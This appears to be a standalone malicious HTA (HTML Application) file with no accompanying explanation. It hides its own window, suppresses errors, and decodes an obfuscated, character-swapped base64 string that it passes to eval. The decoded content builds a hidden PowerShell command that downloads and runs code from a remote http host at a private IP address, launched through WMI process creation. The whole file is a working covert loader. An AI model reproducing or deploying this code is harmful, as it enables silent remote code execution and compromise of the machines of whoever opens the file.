
<html>
<head>
<script language="JScript">
window.resizeTo(1, 1);
window.moveTo(-2000, -2000);
window.blur();

try
{
    window.onfocus = function() { window.blur(); }
    window.onerror = function(sMsg, sUrl, sLine) { return false; }
}
catch (e){}

function replaceAll(find, replace, str) 
{
  while( str.indexOf(find) > -1)
  {
    str = str.replace(find, replace);
  }
  return str;
}
function replace(string)
{
        string = replaceAll(']','=',string);
        string = replaceAll('[','a',string);
        string = replaceAll(',','b',string);
        string = replaceAll('@','D',string);
        string = replaceAll('-','x',string);
        string = replaceAll('~','N',string);
        string = replaceAll('*','E',string);
        string = replaceAll('%','C',string);
        string = replaceAll('$','H',string);
        string = replaceAll('!','G',string);
        string = replaceAll('{','K',string);
        string = replaceAll('}','O',string);
        return string;
}
function bas( string )
    {
 string=replace(string);
       var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        var result     = '';

        var i = 0;
        do {
            var b1 = characters.indexOf( string.charAt(i++) );
            var b2 = characters.indexOf( string.charAt(i++) );
            var b3 = characters.indexOf( string.charAt(i++) );
            var b4 = characters.indexOf( string.charAt(i++) );

            var a = ( ( b1 & 0x3F ) << 2 ) | ( ( b2 >> 4 ) & 0x3 );
            var b = ( ( b2 & 0xF  ) << 4 ) | ( ( b3 >> 2 ) & 0xF );
            var c = ( ( b3 & 0x3  ) << 6 ) | ( b4 & 0x3F );

            result += String.fromCharCode(a) + (b?String.fromCharCode(b):'') + (c?String.fromCharCode(c):'');

        } while( i < string.length );

        return result;
    }

var es = '%gk{dmFyI!~tPSJw,3dlcn~oZW-sI%13I!hpZ!Rl,iBJ,nZv[2UtRXhwcmVzc2lv,ih}ZXctT2JqZW~0I*5ld%5XZWJ@,!ll,nQpLkRvd25s,2FkU3Ry[W5n{%dod$Rw}i8vMTkyLj*2}%4-Ljg6}@A4}S93c2d3Jyk7Ijs{dmFyI$czMnBzPSB$ZXRPYmplY3QoJ3dp,m1n,XRz}icpLkdld%gnV2luMzJfU$JvY2Vzc1~0YXJ0dXAn{Ts{dzMyc$MuU3Bhd25J,n~0YW5jZV8o{Ts{dzMyc$MuU2hvd1dp,mRvdz0w}wp2YXIgcnRy,k~vZ!U9R2V0T2JqZW~0{%d3[W5tZ210czon{S5$ZXQoJ1dp,jMyX1By,2~lc3Mn{S5@cmVhd!UoY20sJ2M6XFwnL$czMnBzL!51,!wp}wo]';
eval(bas(es));
</script>
<hta:application caption="no" showInTaskBar="no" windowState="minimize" navigable="no" scroll="no" />
</head>
<body>
</body>
</html> 	

